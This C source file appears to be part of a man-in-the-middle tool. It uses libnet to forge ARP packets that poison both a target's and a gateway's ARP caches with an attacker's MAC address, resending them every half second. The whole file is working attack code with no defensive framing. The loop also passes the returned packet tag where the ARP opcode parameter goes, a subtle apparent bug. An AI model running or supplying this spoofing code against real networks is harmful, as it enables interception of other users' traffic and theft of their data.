#include "arp.h"
extern bool debug;
int send_fake_ARP(char* dev, u_char* srcMac, u_char* destMac, u_char* srcIp, u_char* destIp,int op){
	libnet_t *net_t = NULL;
	static u_char padPtr[18];
	char err_buf[LIBNET_ERRBUF_SIZE];
	libnet_ptag_t p_tag;
	int res;
	
	/* start libnet */
	net_t = libnet_init(LIBNET_LINK_ADV,dev,err_buf);
	if(!net_t){
		printf("libnet start fail\nmaybe it should run by root\n");
		return -1;
	}

	/* build ARP */
	p_tag= libnet_build_arp(ARPHRD_ETHER,EPT_IPv4,MAC_ADDR_LEN,IPv4_ADDR_LEN,op,
			srcMac,srcIp,destMac,destIp,padPtr,18,net_t,0);
	// the defined of hrd is in ../libnet/libnet-headers.h
	if (p_tag == -1){
		printf("libnet build_arp fail\n");
		libnet_destroy(net_t);
		return -1;
	}

	/* build ethernet */
	p_tag = libnet_build_ethernet(destMac,srcMac,EPT_ARP, padPtr, 0 ,net_t ,0 );
	if(p_tag == -1){
		printf("libnet build_ethernet fail\n");
		libnet_destroy(net_t);
		return -1;
	}

	/* send packet */
	res = libnet_write(net_t);
	if(res == -1){
		printf("ARP libnet write fail\n");
		libnet_destroy(net_t);
		return -1;
	}

	/* success */
        libnet_destroy(net_t);
        return p_tag;	
}
void* arp_spoof(void* info){
	MITM_info* m_info=(MITM_info*)info;
	log_printf(MSG_INFO,"start arp spoof to both gateway and target");
	int p_tag_target;
	int p_tag_gateway;
	p_tag_target=send_fake_ARP(m_info->dev,m_info->ATTACKER_MAC,
				m_info->TARGET_MAC,m_info->GATEWAY_IP,m_info->TARGET_IP,0);
	p_tag_gateway=send_fake_ARP(m_info->dev,m_info->ATTACKER_MAC,
				m_info->GATEWAY_MAC,m_info->TARGET_IP,m_info->GATEWAY_IP,0);
	if(p_tag_target == -1 || p_tag_gateway == -1){
		log_printf(MSG_WARNING,"arp spoof fail");
		return NULL;
	}
	while(1){
		p_tag_target=send_fake_ARP(m_info->dev,m_info->ATTACKER_MAC,m_info->TARGET_MAC,
				m_info->GATEWAY_IP,m_info->TARGET_IP,p_tag_target);
		p_tag_gateway=send_fake_ARP(m_info->dev,m_info->ATTACKER_MAC,m_info->GATEWAY_MAC,
				m_info->TARGET_IP,m_info->GATEWAY_IP,p_tag_gateway);
		if(p_tag_target == -1 || p_tag_gateway == -1)break;
		usleep(500000);
	}
	log_printf(MSG_WARNING,"arp spoof fail,return");
	return NULL;
}
